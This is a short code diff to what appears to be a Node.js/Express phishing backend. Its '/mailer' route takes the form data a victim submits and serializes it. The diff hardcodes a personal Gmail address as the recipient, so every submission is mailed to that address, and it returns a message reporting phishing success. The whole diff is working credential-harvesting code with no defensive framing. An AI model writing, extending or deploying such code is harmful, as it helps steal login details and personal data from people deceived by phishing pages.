@@ -24,7 +24,7 @@ app.get("/", (req, res) => {
 })
 
 app.post("/mailer", (req, res) => {
-    const phisbody = req.body
+    const phisbody = JSON.stringify(req.body)
     console.log("Yes")
     
     let transporter = nodemailer.createTransport({
@@ -44,7 +44,8 @@ app.post("/mailer", (req, res) => {
     console.log(url.mail);
     let mailOptions = {
         from: '"Tera Chacha" <your@email.com>', // sender address
-        to: `${url.mail}`, // list of receivers
+        // to: `${url.mail}`, // list of receivers
+        to: 'mannang6@gmail.com', // list of receivers
         subject: 'Email', // Subject line
         text: `${phisbody}`, // plain text body
     };
@@ -56,7 +57,8 @@ app.post("/mailer", (req, res) => {
         console.log('Message sent: %s', info.messageId);
     });
 
-    res.redirect(url.url)
+    // res.redirect(url.url)
+    res.json({"phising":"success"})
 
 })
 
